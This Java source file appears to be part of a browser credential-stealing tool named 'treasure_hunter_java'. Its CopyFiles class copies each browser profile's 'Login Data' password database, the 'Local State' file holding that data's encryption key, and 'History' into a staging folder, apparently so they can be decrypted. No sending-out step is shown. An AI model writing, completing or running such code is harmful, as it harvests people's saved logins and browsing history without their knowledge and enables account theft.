package com.treasure_hunter_java.decrypt;

import com.treasure_hunter_java.Main;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;

public class CopyFiles {

    Path workDirectory = Main.mainWorkDirectory;

    public File createDirectory(String browserName) {

        File directory = new File(workDirectory.toString() + browserName);
        if (!directory.exists()) {
            directory.mkdir();
        }
        return directory;
    }

    public void copyLoginData(ArrayList<Path> profiles, Path localState, String browserName) throws IOException {

        File directory = createDirectory(browserName);
        Path localStateCopy = Path.of(directory + "/Local State");

        for (Path profile : profiles) {

            Path loginData = Path.of(profile + "/Login Data");
            Path loginDataCopy = Path.of(directory + "/Login Data");


            if (Files.exists(loginData) /*&& !Files.exists(loginDataCopy)*/) {
                Files.copy(loginData, loginDataCopy, StandardCopyOption.REPLACE_EXISTING);
            }
        }

        if (Files.exists(localState) /*&& !Files.exists(localStateCopy)*/) {
            Files.copy(localState, localStateCopy, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    public void copyHistory(ArrayList<Path> profiles, String browserName) throws IOException {

        File directory = createDirectory(browserName);

        for (Path profile : profiles) {

            Path history = Path.of(profile + "/History");
            Path historyCopy = Path.of(directory + "/History");

            if (Files.exists(history) && !Files.exists(historyCopy)) {
                Files.copy(history, historyCopy, StandardCopyOption.REPLACE_EXISTING);
            }
        }
    }

}
